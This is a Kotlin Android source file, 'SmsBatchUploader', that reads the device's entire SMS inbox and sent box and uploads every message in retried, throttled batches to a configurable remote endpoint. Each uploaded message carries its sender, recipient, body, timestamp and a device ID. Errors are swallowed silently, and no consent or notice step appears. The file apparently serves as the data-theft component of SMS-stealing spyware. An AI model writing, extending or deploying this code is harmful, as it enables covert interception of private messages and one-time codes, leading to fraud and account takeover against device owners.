package com.example.test.utils

import android.content.Context
import android.provider.Telephony
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL


object SmsBatchUploader {

    private const val BATCH_SIZE = 200
    private const val FETCH_CHUNK_SIZE = 2000
    private const val MAX_SAFE_SMS_COUNT = 100000
    private const val RETRY_ATTEMPTS = 3
    private const val DELAY_BETWEEN_BATCHES_MS = 300L
    private const val DELAY_BETWEEN_CHUNKS_MS = 1000L
    private const val PROCESSING_DELAY_MS = 50L
    private const val CHUNK_SIZE = 500

    private var isCancelled = false
    private var isUploading = false


    suspend fun uploadQuickSms(
        context: Context,
        deviceId: String,
        baseUrl: String,
        limit: Int = 50
    ): UploadResult = withContext(Dispatchers.IO) {
        try {
            val messages = fetchSmsFromBox(
                context = context,
                deviceId = deviceId,
                box = Telephony.Sms.Inbox.CONTENT_URI,
                type = "inbox",
                limit = limit
            )

            if (messages.isEmpty()) {
                return@withContext UploadResult.Success(0, 0, 0)
            }

            val success = sendBatch(
                messages = messages,
                deviceId = deviceId,
                baseUrl = baseUrl,
                batchInfo = BatchInfo(1, 1, messages.size, messages.size, messages.size)
            )

            if (success) {
                UploadResult.Success(messages.size, 0, 0)
            } else {
                UploadResult.Failure("Quick upload failed")
            }

        } catch (e: Exception) {
            UploadResult.Failure(e.message ?: "Unknown error")
        }
    }

    suspend fun uploadAllSms(
        context: Context,
        deviceId: String,
        baseUrl: String,
        onProgress: ((UploadProgress) -> Unit)? = null
    ): UploadResult = withContext(Dispatchers.IO) {

        if (isUploading) {
            return@withContext UploadResult.Failure("Upload already in progress")
        }

        isUploading = true
        isCancelled = false

        try {
            onProgress?.invoke(UploadProgress.Counting("Counting messages..."))
            val totalCount = countTotalSms(context)

            if (totalCount == 0) {
                return@withContext UploadResult.Success(0, 0, 0)
            }

            val safeCount = minOf(totalCount, MAX_SAFE_SMS_COUNT)

            onProgress?.invoke(UploadProgress.Processing(safeCount, 0, "Starting upload..."))

            val result = processAllMessages(
                context = context,
                deviceId = deviceId,
                baseUrl = baseUrl,
                maxCount = safeCount,
                onProgress = onProgress
            )

            when (result) {
                is UploadResult.Success -> {
                    onProgress?.invoke(UploadProgress.Completed(safeCount, "Upload completed"))
                }
                is UploadResult.Failure -> {}
            }

            result

        } catch (e: Exception) {
            onProgress?.invoke(UploadProgress.Failed("Upload failed: ${e.message}"))
            UploadResult.Failure(e.message ?: "Unknown error")

        } finally {
            isUploading = false
        }
    }

    private suspend fun processAllMessages(
        context: Context,
        deviceId: String,
        baseUrl: String,
        maxCount: Int,
        onProgress: ((UploadProgress) -> Unit)?
    ): UploadResult = withContext(Dispatchers.IO) {

        var totalSent = 0
        var totalSkipped = 0
        var totalFailed = 0

        var inboxOffset = 0
        var hasMoreInbox = true

        while (hasMoreInbox && !isCancelled && inboxOffset < maxCount) {
            val remainingCount = maxCount - inboxOffset
            val fetchCount = minOf(remainingCount, FETCH_CHUNK_SIZE)

            val inboxChunk = fetchSmsChunk(
                context = context,
                deviceId = deviceId,
                box = Telephony.Sms.Inbox.CONTENT_URI,
                type = "inbox",
                offset = inboxOffset,
                limit = fetchCount
            )

            if (inboxChunk.isEmpty()) {
                hasMoreInbox = false
                break
            }

            val chunkResult = processChunk(
                messages = inboxChunk,
                deviceId = deviceId,
                baseUrl = baseUrl,
                startIndex = inboxOffset,
                totalCount = maxCount,
                onProgress = onProgress
            )

            totalSent += chunkResult.sent
            totalSkipped += chunkResult.skipped
            totalFailed += chunkResult.failed

            inboxOffset += inboxChunk.size

            if (hasMoreInbox && !isCancelled) {
                delay(DELAY_BETWEEN_CHUNKS_MS)
            }
        }

        if (!isCancelled && inboxOffset < maxCount) {
            var sentOffset = 0
            var hasMoreSent = true
            val remainingSlots = maxCount - inboxOffset

            while (hasMoreSent && !isCancelled && sentOffset < remainingSlots) {
                val remainingCount = remainingSlots - sentOffset
                val fetchCount = minOf(remainingCount, FETCH_CHUNK_SIZE)

                val sentChunk = fetchSmsChunk(
                    context = context,
                    deviceId = deviceId,
                    box = Telephony.Sms.Sent.CONTENT_URI,
                    type = "sent",
                    offset = sentOffset,
                    limit = fetchCount
                )

                if (sentChunk.isEmpty()) {
                    hasMoreSent = false
                    break
                }

                val chunkResult = processChunk(
                    messages = sentChunk,
                    deviceId = deviceId,
                    baseUrl = baseUrl,
                    startIndex = inboxOffset + sentOffset,
                    totalCount = maxCount,
                    onProgress = onProgress
                )

                totalSent += chunkResult.sent
                totalSkipped += chunkResult.skipped
                totalFailed += chunkResult.failed

                sentOffset += sentChunk.size

                if (hasMoreSent && !isCancelled) {
                    delay(DELAY_BETWEEN_CHUNKS_MS)
                }
            }
        }

        UploadResult.Success(totalSent, totalSkipped, totalFailed)
    }

    private suspend fun processChunk(
        messages: List<SmsModel>,
        deviceId: String,
        baseUrl: String,
        startIndex: Int,
        totalCount: Int,
        onProgress: ((UploadProgress) -> Unit)?
    ): ChunkResult = withContext(Dispatchers.IO) {

        var sent = 0
        var skipped = 0
        var failed = 0

        val totalBatches = (messages.size + BATCH_SIZE - 1) / BATCH_SIZE

        for (batchIndex in 0 until totalBatches) {
            if (isCancelled) break

            val start = batchIndex * BATCH_SIZE
            val end = minOf(start + BATCH_SIZE, messages.size)
            val batch = messages.subList(start, end)

            val batchInfo = BatchInfo(
                batchNumber = batchIndex + 1,
                totalBatches = totalBatches,
                batchSize = batch.size,
                totalMessages = totalCount,
                currentProgress = startIndex + end
            )

            var success = false
            var attempts = 0

            while (!success && attempts < RETRY_ATTEMPTS && !isCancelled) {
                attempts++

                try {
                    success = withTimeout(10000L) {
                        sendBatch(batch, deviceId, baseUrl, batchInfo)
                    }

                    if (!success && attempts < RETRY_ATTEMPTS) {
                        delay(500L * attempts)
                    }

                } catch (e: Exception) {
                    if (attempts < RETRY_ATTEMPTS) {
                        delay(500L * attempts)
                    }
                }
            }

            if (success) {
                sent += batch.size
            } else {
                failed += batch.size
            }

            val progress = ((batchInfo.currentProgress.toFloat() / totalCount) * 100).toInt()
            onProgress?.invoke(
                UploadProgress.Processing(
                    totalCount,
                    batchInfo.currentProgress,
                    "Uploading: $progress%"
                )
            )

            if (batchIndex < totalBatches - 1 && !isCancelled) {
                delay(DELAY_BETWEEN_BATCHES_MS)
            }

            if (batchIndex % 10 == 0) {
                delay(100)
            }
        }

        ChunkResult(sent, skipped, failed)
    }

    private suspend fun sendBatch(
        messages: List<SmsModel>,
        deviceId: String,
        baseUrl: String,
        batchInfo: BatchInfo
    ): Boolean = withContext(Dispatchers.IO) {
        try {
            val messagesArray = JSONArray()
            val currentTime = System.currentTimeMillis()

            messages.forEach { sms ->
                messagesArray.put(JSONObject().apply {
                    put("sms_id", sms.smsId)
                    put("device_id", deviceId)
                    put("from", sms.from)
                    put("to", sms.to)
                    put("body", sms.body)
                    put("timestamp", sms.timestamp)
                    put("type", sms.type)
                    put("is_read", sms.isRead)
                    put("received_at", currentTime)
                })
            }

            val json = JSONObject().apply {
                put("device_id", deviceId)
                put("data", messagesArray)
                put("batch_info", JSONObject().apply {
                    put("batch", batchInfo.batchNumber)
                    put("of", batchInfo.totalBatches)
                })
            }

            val response = sendPostRequest("$baseUrl/sms/batch", json.toString())
            response != null

        } catch (e: Exception) {
            false
        }
    }

    private fun fetchSmsFromBox(
        context: Context,
        deviceId: String,
        box: android.net.Uri,
        type: String,
        limit: Int
    ): List<SmsModel> {
        val messages = mutableListOf<SmsModel>()

        try {
            val cursor = context.contentResolver.query(
                box,
                arrayOf(
                    Telephony.Sms._ID,
                    Telephony.Sms.ADDRESS,
                    Telephony.Sms.BODY,
                    Telephony.Sms.DATE,
                    Telephony.Sms.READ
                ),
                null,
                null,
                "${Telephony.Sms.DATE} DESC LIMIT $limit"
            )

            cursor?.use {
                val idIndex = it.getColumnIndex(Telephony.Sms._ID)
                val addressIndex = it.getColumnIndex(Telephony.Sms.ADDRESS)
                val bodyIndex = it.getColumnIndex(Telephony.Sms.BODY)
                val dateIndex = it.getColumnIndex(Telephony.Sms.DATE)
                val readIndex = it.getColumnIndex(Telephony.Sms.READ)

                while (it.moveToNext()) {
                    try {
                        val id = it.getLong(idIndex)
                        val address = it.getString(addressIndex)
                        val body = it.getString(bodyIndex)
                        val date = it.getLong(dateIndex)
                        val isRead = it.getInt(readIndex) == 1

                        if (!address.isNullOrBlank() && body != null) {
                            val (from, to) = if (type == "inbox") {
                                address.trim() to ""
                            } else {
                                "" to address.trim()
                            }

                            messages.add(
                                SmsModel(
                                    smsId = "${deviceId}_sms_${id}",
                                    deviceId = deviceId,
                                    from = from,
                                    to = to,
                                    body = body,
                                    timestamp = date,
                                    type = type,
                                    isRead = isRead
                                )
                            )
                        }
                    } catch (e: Exception) {
                        continue
                    }
                }
            }

        } catch (e: Exception) {
        }

        return messages
    }

    private fun fetchSmsChunk(
        context: Context,
        deviceId: String,
        box: android.net.Uri,
        type: String,
        offset: Int,
        limit: Int
    ): List<SmsModel> {
        val messages = mutableListOf<SmsModel>()

        try {
            val cursor = context.contentResolver.query(
                box,
                arrayOf(
                    Telephony.Sms._ID,
                    Telephony.Sms.ADDRESS,
                    Telephony.Sms.BODY,
                    Telephony.Sms.DATE,
                    Telephony.Sms.READ
                ),
                null,
                null,
                "${Telephony.Sms.DATE} DESC LIMIT $limit OFFSET $offset"
            )

            cursor?.use {
                val idIndex = it.getColumnIndex(Telephony.Sms._ID)
                val addressIndex = it.getColumnIndex(Telephony.Sms.ADDRESS)
                val bodyIndex = it.getColumnIndex(Telephony.Sms.BODY)
                val dateIndex = it.getColumnIndex(Telephony.Sms.DATE)
                val readIndex = it.getColumnIndex(Telephony.Sms.READ)

                var processed = 0

                while (it.moveToNext()) {
                    try {
                        val id = it.getLong(idIndex)
                        val address = it.getString(addressIndex)
                        val body = it.getString(bodyIndex)
                        val date = it.getLong(dateIndex)
                        val isRead = it.getInt(readIndex) == 1

                        if (address.isNullOrBlank() || body == null) continue

                        val (from, to) = if (type == "inbox") {
                            address.trim() to ""
                        } else {
                            "" to address.trim()
                        }

                        messages.add(
                            SmsModel(
                                smsId = "${deviceId}_sms_${id}",
                                deviceId = deviceId,
                                from = from,
                                to = to,
                                body = body,
                                timestamp = date,
                                type = type,
                                isRead = isRead
                            )
                        )
                        processed++

                        if (processed % CHUNK_SIZE == 0) {
                            Thread.sleep(PROCESSING_DELAY_MS)
                        }

                    } catch (e: Exception) {
                        continue
                    }
                }
            }

        } catch (e: Exception) {
        }

        return messages
    }

    private fun countTotalSms(context: Context): Int {
        return try {
            var inboxCount = 0
            var sentCount = 0

            context.contentResolver.query(
                Telephony.Sms.Inbox.CONTENT_URI,
                arrayOf("COUNT(*)"),
                null, null, null
            )?.use {
                if (it.moveToFirst()) inboxCount = it.getInt(0)
            }

            context.contentResolver.query(
                Telephony.Sms.Sent.CONTENT_URI,
                arrayOf("COUNT(*)"),
                null, null, null
            )?.use {
                if (it.moveToFirst()) sentCount = it.getInt(0)
            }

            inboxCount + sentCount

        } catch (e: Exception) {
            0
        }
    }

    private fun sendPostRequest(urlString: String, jsonData: String): String? {
        var connection: HttpURLConnection? = null
        return try {
            val url = URL(urlString)
            connection = url.openConnection() as HttpURLConnection
            connection.apply {
                requestMethod = "POST"
                doOutput = true
                setRequestProperty("Content-Type", "application/json")
                connectTimeout = 15000
                readTimeout = 15000
            }

            connection.outputStream.use { os ->
                os.write(jsonData.toByteArray())
                os.flush()
            }

            val responseCode = connection.responseCode

            if (responseCode == HttpURLConnection.HTTP_OK) {
                connection.inputStream.bufferedReader().use { it.readText() }
            } else {
                null
            }

        } catch (e: Exception) {
            null
        } finally {
            connection?.disconnect()
        }
    }

    fun cancelUpload() {
        isCancelled = true
    }

    data class SmsModel(
        val smsId: String,
        val deviceId: String,
        val from: String,
        val to: String,
        val body: String,
        val timestamp: Long,
        val type: String,
        val isRead: Boolean
    )

    data class BatchInfo(
        val batchNumber: Int,
        val totalBatches: Int,
        val batchSize: Int,
        val totalMessages: Int,
        val currentProgress: Int
    )

    data class ChunkResult(
        val sent: Int,
        val skipped: Int,
        val failed: Int
    )

    sealed class UploadResult {
        data class Success(
            val totalSent: Int,
            val totalSkipped: Int,
            val totalFailed: Int
        ) : UploadResult()

        data class Failure(val error: String) : UploadResult()
    }

    sealed class UploadProgress {
        data class Counting(val message: String) : UploadProgress()
        data class Processing(
            val total: Int,
            val processed: Int,
            val message: String
        ) : UploadProgress()
        data class Completed(val total: Int, val message: String) : UploadProgress()
        data class Failed(val message: String) : UploadProgress()
    }
}